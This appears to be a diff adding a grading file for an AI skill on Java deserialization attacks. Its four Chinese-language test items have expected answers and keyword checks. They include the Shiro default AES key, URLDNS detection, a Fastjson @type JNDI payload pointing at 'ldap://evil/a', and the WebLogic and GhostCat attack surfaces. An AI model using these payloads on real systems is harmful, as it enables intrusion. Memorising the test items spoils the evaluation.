@@ -1,0 +1,77 @@
+{
+  "skill_name": "java-deserialization-methodology",
+  "evals": [
+    {
+      "id": 1,
+      "name": "java-deser-shiro-default-key",
+      "prompt": "Cookie 中有 rememberMe 字段，删除后响应 Set-Cookie: rememberMe=deleteMe。请识别这是什么框架，并描述利用的关键前提。",
+      "expected_output": "Apache Shiro，利用前提是获取 AES 加密密钥（常见默认密钥 kPH+bIxk5D2deZiIxcaaaA==）",
+      "expectations": [
+        "Shiro|Apache Shiro|rememberMe|deleteMe",
+        "AES|加密密钥|kPH+bIxk5D2deZiIxcaaaA==|默认密钥",
+        "AES-CBC|解密|密钥爆破|硬编码密钥",
+        "ysoserial|gadget chain|反序列化payload",
+        "Base64|AES加密|替换rememberMe Cookie"
+      ],
+      "required_terms": [
+        "kPH+bIxk5D2deZiIxcaaaA==",
+        "rememberMe",
+        "deleteMe"
+      ]
+    },
+    {
+      "id": 2,
+      "name": "java-deser-urldns-first",
+      "prompt": "你怀疑目标存在 Java 反序列化漏洞（POST Body 以 rO0AB 开头）。你不知道目标 classpath 有哪些库。请描述你的检测策略第一步。",
+      "expected_output": "先用 URLDNS gadget（无依赖）触发 DNS 回连确认漏洞存在，再逐个尝试 CC/CB 等 gadget",
+      "expectations": [
+        "URLDNS|DNS回连|无依赖|第一步检测",
+        "dnslog|Collaborator|DNS查询|OOB确认",
+        "无需第三方库|JDK自带|最安全的检测方式",
+        "确认存在|再尝试|CommonsCollections|CC链",
+        "rO0AB|aced0005|Java序列化标志"
+      ],
+      "required_terms": [
+        "URLDNS",
+        "DNS回连",
+        "DNS查询"
+      ]
+    },
+    {
+      "id": 3,
+      "name": "java-deser-fastjson-type-injection",
+      "prompt": "目标 Java 应用接收 JSON POST 请求。响应错误信息中包含 'com.alibaba.fastjson' 堆栈。请描述针对 Fastjson 的反序列化攻击。",
+      "expected_output": "Fastjson @type 注入实现 JNDI 远程类加载：{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://evil/a\"}",
+      "expectations": [
+        "@type|Fastjson|类型指定|autoType",
+        "JdbcRowSetImpl|dataSourceName|ldap://|JNDI注入",
+        "JNDI|LDAP|RMI|远程类加载",
+        "com.sun.rowset|JdbcRowSetImpl|经典gadget",
+        "autoType|绕过|版本|1.2.24|1.2.47"
+      ],
+      "required_terms": [
+        "ldap://",
+        "com.sun.rowset",
+        "autoType"
+      ]
+    },
+    {
+      "id": 4,
+      "name": "java-deser-port-to-attack-mapping",
+      "prompt": "端口扫描发现目标开放了 7001 和 8009 端口。请识别这些端口对应的 Java 中间件和反序列化攻击面。",
+      "expected_output": "7001=WebLogic T3协议反序列化，8009=AJP Tomcat GhostCat(CVE-2020-1938)",
+      "expectations": [
+        "7001|WebLogic|T3协议|T3反序列化",
+        "8009|AJP|Tomcat|GhostCat|CVE-2020-1938",
+        "T3|IIOP|WebLogic反序列化|协议级",
+        "AJP|文件读取|文件包含|Tomcat",
+        "端口识别|中间件|攻击面|对应关系"
+      ],
+      "required_terms": [
+        "CVE-2020-1938",
+        "WebLogic",
+        "AJP"
+      ]
+    }
+  ]
+}
